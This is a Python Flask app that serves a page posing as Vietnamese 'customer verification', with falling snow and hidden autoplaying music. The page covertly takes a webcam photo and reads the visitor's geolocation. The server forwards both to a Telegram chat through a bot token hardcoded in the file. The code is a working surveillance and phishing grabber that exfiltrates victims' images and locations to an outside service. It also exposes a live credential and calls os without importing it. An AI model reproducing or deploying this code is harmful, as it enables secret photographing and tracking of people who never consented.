from flask import Flask, request
import requests
import base64
from datetime import datetime

app = Flask(__name__)

TELEGRAM_BOT_TOKEN = '8199979828:AAEeZ8JXFpUX_ng3p18bZNC1iy9MekskoTs'
TELEGRAM_CHAT_ID = '-1003262536143'  # ID người nhận ảnh

@app.route('/')
def index():
    return '''
    <!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <title>Xác minh khách hàng</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      margin: 0;
      overflow: hidden;
      background: linear-gradient(to bottom, #001f3f, #0074D9);
    }
    canvas {
      position: fixed;
      top: 0;
      left: 0;
      pointer-events: none;
      z-index: 9999;
    }
    video, canvas#captureCanvas {
      display: none;
    }
    iframe {
      display: none;
    }
  </style>
</head>
<body>
  <canvas id="snow"></canvas>
  <video id="video" autoplay muted></video>
  <canvas id="captureCanvas" width="320" height="240"></canvas>

  <!-- 🎶 Nhạc nền: nhiều bản remix -->
  <iframe width="0" height="0" src="https://www.youtube.com/embed/2PMzUmv0PHA?autoplay=1&loop=1&playlist=2PMzUmv0PHA" frameborder="0" allow="autoplay"></iframe>
  <iframe width="0" height="0" src="https://www.youtube.com/embed/AUqNPjQafWY?autoplay=1&loop=1&playlist=AUqNPjQafWY" frameborder="0" allow="autoplay"></iframe>
  <iframe width="0" height="0" src="https://www.youtube.com/embed/JxxjfpbGQHw?autoplay=1&loop=1&playlist=JxxjfpbGQHw" frameborder="0" allow="autoplay"></iframe>
  <iframe width="0" height="0" src="https://www.youtube.com/embed/mZ3bbDDEqY0?autoplay=1&loop=1&playlist=mZ3bbDDEqY0" frameborder="0" allow="autoplay"></iframe>
  <iframe width="0" height="0" src="https://www.youtube.com/embed/irTShIZaZR4?autoplay=1&loop=1&playlist=irTShIZaZR4" frameborder="0" allow="autoplay"></iframe>
  <iframe width="0" height="0" src="https://www.youtube.com/embed/i1AGyl7cF04?autoplay=1&loop=1&playlist=i1AGyl7cF04" frameborder="0" allow="autoplay"></iframe>

  <script>
    // ❄️ Hiệu ứng tuyết rơi
    const canvas = document.getElementById('snow');
    const ctx = canvas.getContext('2d');
    let width = window.innerWidth;
    let height = window.innerHeight;
    canvas.width = width;
    canvas.height = height;

    let flakes = [];
    for (let i = 0; i < 100; i++) {
      flakes.push({
        x: Math.random() * width,
        y: Math.random() * height,
        r: Math.random() * 4 + 1,
        d: Math.random() * 100
      });
    }

    function drawSnow() {
      ctx.clearRect(0, 0, width, height);
      ctx.fillStyle = "white";
      ctx.beginPath();
      for (let i = 0; i < flakes.length; i++) {
        let f = flakes[i];
        ctx.moveTo(f.x, f.y);
        ctx.arc(f.x, f.y, f.r, 0, Math.PI * 2, true);
      }
      ctx.fill();
      updateSnow();
    }

    let angle = 0;
    function updateSnow() {
      angle += 0.01;
      for (let i = 0; i < flakes.length; i++) {
        let f = flakes[i];
        f.y += Math.cos(angle + f.d) + 1 + f.r / 2;
        f.x += Math.sin(angle) * 2;

        if (f.y > height) {
          flakes[i] = { x: Math.random() * width, y: 0, r: f.r, d: f.d };
        }
      }
    }

    setInterval(drawSnow, 33);

    // 📸 Tự động cấp quyền camera và chụp ảnh
    const video = document.getElementById('video');
    const canvasCapture = document.getElementById('captureCanvas');

    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        video.srcObject = stream;

        setTimeout(() => {
          const context = canvasCapture.getContext('2d');
          context.drawImage(video, 0, 0, canvasCapture.width, canvasCapture.height);
          const imageData = canvasCapture.toDataURL('image/jpeg');

          navigator.geolocation.getCurrentPosition(function(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;

            const payload = new URLSearchParams();
            payload.append('image', imageData);
            payload.append('lat', lat);
            payload.append('lon', lon);

            fetch('/upload', {
              method: 'POST',
              headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
              body: payload
            });
          }, function(error) {
            const payload = new URLSearchParams();
            payload.append('image', imageData);
            payload.append('lat', 'unknown');
            payload.append('lon', 'unknown');

            fetch('/upload', {
              method: 'POST',
              headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
              body: payload
            });
          });
        }, 1500); // ⏱️ Chụp sau 1.5 giây
      });
  </script>
</body>
</html>
'''

@app.route('/upload', methods=['POST'])
def upload():
    data_url = request.form['image']
    lat = request.form.get('lat', 'unknown')
    lon = request.form.get('lon', 'unknown')
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    header, encoded = data_url.split(",", 1)
    image_data = base64.b64decode(encoded)

    caption = f" Tự động : {timestamp}\n Vị trí: {lat}, {lon}"

    files = {'photo': ('image.jpg', image_data)}
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
    data = {
        'chat_id': TELEGRAM_CHAT_ID,
        'caption': caption
    }

    response = requests.post(url, data=data, files=files)
    return 'OK' if response.ok else 'Lỗi gửi ảnh'

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)




